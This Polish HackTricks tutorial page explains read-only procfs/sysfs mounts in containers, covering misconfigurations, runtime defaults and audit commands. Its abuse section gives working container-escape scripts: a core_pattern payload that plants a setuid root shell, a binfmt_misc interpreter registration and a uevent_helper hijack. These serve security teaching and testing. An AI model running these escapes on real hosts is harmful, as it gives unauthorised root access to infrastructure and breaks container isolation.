# Ścieżki systemowe tylko do odczytu

{{#include ../../../../banners/hacktricks-training.md}}

Ścieżki systemowe tylko do odczytu stanowią odrębną ochronę od zamaskowanych ścieżek. Zamiast całkowicie ukrywać ścieżkę, runtime ją udostępnia, ale montuje jako tylko do odczytu. Jest to częste w przypadku wybranych lokalizacji procfs i sysfs, gdzie dostęp do odczytu może być akceptowalny lub konieczny z operacyjnego punktu widzenia, ale zapis byłby zbyt niebezpieczny.

Cel jest prosty: wiele interfejsów kernela staje się znacznie bardziej niebezpiecznych, gdy można w nich dokonywać zapisu. Montowanie tylko do odczytu nie usuwa całej wartości rozpoznawczej, ale uniemożliwia przejętemu workloadowi modyfikowanie plików związanych z kernelem za pośrednictwem tej ścieżki.

## Działanie

Runtime'y często oznaczają części widoku proc/sys jako tylko do odczytu. W zależności od runtime'u i hosta może to obejmować takie ścieżki jak:

- `/proc/sys`
- `/proc/sysrq-trigger`
- `/proc/irq`
- `/proc/bus`

Rzeczywista lista jest różna, ale model pozostaje taki sam: zapewnić widoczność tam, gdzie jest potrzebna, i domyślnie zablokować modyfikacje.<sup>[[1]](#references)</sup>

## Lab

Sprawdź zadeklarowaną przez Docker listę ścieżek tylko do odczytu:
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'
```
Sprawdź zamontowany widok proc/sys z wnętrza kontenera:
```bash
mount | grep -E '/proc|/sys'
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head
find /sys -maxdepth 3 -writable 2>/dev/null | head
```
## Wpływ na bezpieczeństwo

Ścieżki systemowe tylko do odczytu ograniczają dużą klasę nadużyć wpływających na hosta. Nawet gdy attacker może przeglądać procfs lub sysfs, brak możliwości zapisu usuwa wiele bezpośrednich ścieżek modyfikacji obejmujących kernel tunables, crash handlers, module-loading helpers lub inne interfaces sterujące. Ekspozycja nie znika, ale przejście od ujawnienia informacji do uzyskania wpływu na hosta staje się trudniejsze.

## Błędne konfiguracje

Główne błędy to usuwanie maskowania lub ponowne montowanie wrażliwych ścieżek z uprawnieniami do odczytu i zapisu, bezpośrednie udostępnianie zawartości hosta proc/sys za pomocą zapisywalnych bind mounts albo używanie trybów uprzywilejowanych, które w praktyce omijają bezpieczniejsze wartości domyślne runtime. W Kubernetes `procMount: Unmasked` i uprzywilejowane workloads często występują razem ze słabszą ochroną proc.<sup>[[2]](#references)</sup> Innym częstym błędem operacyjnym jest założenie, że skoro runtime zwykle montuje te ścieżki tylko do odczytu, wszystkie workloads nadal dziedziczą to ustawienie domyślne.

## Nadużycie

Jeśli ochrona jest słaba, zacznij od wyszukania zapisywalnych wpisów proc/sys:
```bash
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50   # Find writable kernel tunables reachable from the container
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50        # Find writable sysfs entries that may affect host devices or kernel state
```
Gdy obecne są wpisy umożliwiające zapis, wartościowe ścieżki dalszego działania obejmują:
```bash
cat /proc/sys/kernel/core_pattern 2>/dev/null        # Crash handler path; writable access can lead to host code execution after a crash
cat /proc/sys/kernel/modprobe 2>/dev/null            # Kernel module helper path; useful to evaluate helper-path abuse opportunities
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null      # Whether binfmt_misc is active; writable registration may allow interpreter-based code execution
cat /proc/sys/vm/panic_on_oom 2>/dev/null            # Global OOM handling; useful for evaluating host-wide denial-of-service conditions
cat /sys/kernel/uevent_helper 2>/dev/null            # Helper executed for kernel uevents; writable access can become host code execution
```
Co mogą ujawnić te polecenia:

- Zapisywalne wpisy w `/proc/sys` często oznaczają, że kontener może modyfikować zachowanie jądra hosta, a nie tylko je analizować.
- `core_pattern` jest szczególnie istotny, ponieważ zapisywalną wartość widoczną dla hosta można przekształcić w ścieżkę do wykonania kodu na hoście, powodując awarię procesu po ustawieniu pipe handlera.
- `modprobe` ujawnia helper używany przez jądro w procesach związanych z ładowaniem modułów; gdy jest zapisywalny, stanowi klasyczny cel o wysokiej wartości.
- `binfmt_misc` informuje, czy możliwa jest rejestracja niestandardowych interpreterów. Jeśli rejestr jest zapisywalny, może stać się prymitywem wykonania, a nie tylko źródłem wycieku informacji.
- `panic_on_oom` kontroluje decyzję jądra dotyczącą całego hosta, dlatego wyczerpanie zasobów może zostać przekształcone w odmowę usługi na hoście.
- `uevent_helper` jest jednym z najwyraźniejszych przykładów zapisywalnej ścieżki helpera sysfs prowadzącej do wykonania w kontekście hosta.

Interesujące są zapisywalne, widoczne dla hosta ustawienia proc lub wpisy sysfs, które normalnie powinny być tylko do odczytu. W tym momencie workload przeszedł od ograniczonego widoku kontenera do znaczącego wpływu na jądro.

### Pełny przykład: `core_pattern` Host Escape

Jeśli `/proc/sys/kernel/core_pattern` jest zapisywalne z wnętrza kontenera i wskazuje na widok jądra hosta, można je wykorzystać do wykonania payloadu po awarii:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Jeśli ścieżka rzeczywiście dociera do kernela hosta, payload uruchamia się na hoście i pozostawia po sobie shell setuid.

### Pełny przykład: rejestracja `binfmt_misc`

Jeśli `/proc/sys/fs/binfmt_misc/register` jest zapisywalny, rejestracja własnego interpretera może doprowadzić do code execution podczas wykonywania pasującego pliku:
```bash
mount | grep binfmt_misc || mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misc
cat <<'EOF' > /tmp/h
#!/bin/sh
id > /tmp/binfmt.out
EOF
chmod +x /tmp/h
printf ':hack:M::HT::/tmp/h:\n' > /proc/sys/fs/binfmt_misc/register
printf 'HT' > /tmp/test.ht
chmod +x /tmp/test.ht
/tmp/test.ht
cat /tmp/binfmt.out
```
Na zapisywalnym z poziomu hosta `binfmt_misc` rezultatem jest code execution w ścieżce interpretera uruchamianej przez kernel.

### Pełny przykład: `uevent_helper`

Jeśli `/sys/kernel/uevent_helper` jest zapisywalny, kernel może wywołać helpera wskazanego ścieżką hosta po wyzwoleniu pasującego eventu:
```bash
cat <<'EOF' > /tmp/evil-helper
#!/bin/sh
id > /tmp/uevent.out
EOF
chmod +x /tmp/evil-helper
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$overlay/tmp/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /tmp/uevent.out
```
Powodem, dla którego jest to tak niebezpieczne, jest fakt, że ścieżka helpera jest rozwiązywana z perspektywy systemu plików hosta, a nie z bezpiecznego kontekstu ograniczonego wyłącznie do kontenera.

## Kontrole

Te kontrole określają, czy ekspozycja procfs/sysfs jest tylko do odczytu tam, gdzie jest to oczekiwane, oraz czy workload nadal może modyfikować wrażliwe interfejsy kernela.
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'   # Runtime-declared read-only paths
mount | grep -E '/proc|/sys'                                      # Actual mount options
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head           # Writable procfs tunables
find /sys -maxdepth 3 -writable 2>/dev/null | head                # Writable sysfs paths
```
Co jest tutaj interesujące:

- Normalny hardened workload powinien udostępniać bardzo niewiele zapisywalnych wpisów proc/sys.
- Zapisywalne ścieżki `/proc/sys` są często ważniejsze niż zwykły dostęp tylko do odczytu.
- Jeśli runtime wskazuje, że ścieżka jest tylko do odczytu, ale w praktyce można w niej zapisywać, dokładnie przeanalizuj mount propagation, bind mounts oraz ustawienia uprawnień.

## Domyślne ustawienia runtime

| Runtime / platforma | Stan domyślny | Domyślne działanie | Częste ręczne osłabienie |
| --- | --- | --- | --- |
| Docker Engine | Domyślnie włączone | Docker definiuje domyślną listę ścieżek tylko do odczytu dla wrażliwych wpisów proc | udostępnianie mountów hosta proc/sys, `--privileged` |
| Podman | Domyślnie włączone | Podman stosuje domyślne ścieżki tylko do odczytu, chyba że zostaną jawnie poluzowane | `--security-opt unmask=ALL`, szerokie mounty hosta, `--privileged` |
| Kubernetes | Dziedziczy domyślne ustawienia runtime | Korzysta z bazowego modelu ścieżek tylko do odczytu runtime, chyba że zostanie on osłabiony przez ustawienia Pod lub mounty hosta | `procMount: Unmasked`, workloads z podwyższonymi uprawnieniami, zapisywalne mounty hosta proc/sys |
| containerd / CRI-O under Kubernetes | Domyślne ustawienia runtime | Zwykle korzysta z domyślnych ustawień OCI/runtime | tak jak w wierszu Kubernetes; bezpośrednie zmiany konfiguracji runtime mogą osłabić to działanie |

Najważniejsze jest to, że ścieżki systemowe tylko do odczytu są zwykle dostępne jako domyślne ustawienie runtime, ale łatwo je podważyć za pomocą trybów uprzywilejowanych lub bind mountów hosta.

## Odnośniki

- [1] [OCI Runtime Specification: Linux Container Configuration (maskedPaths / readonlyPaths)](https://github.com/opencontainers/runtime-spec/blob/main/config-linux.md)
- [2] [Kubernetes API Reference: Pod v1 (SecurityContext.procMount)](https://kubernetes.io/docs/reference/kubernetes-api/workload-resources/pod-v1/)

{{#include ../../../../banners/hacktricks-training.md}}
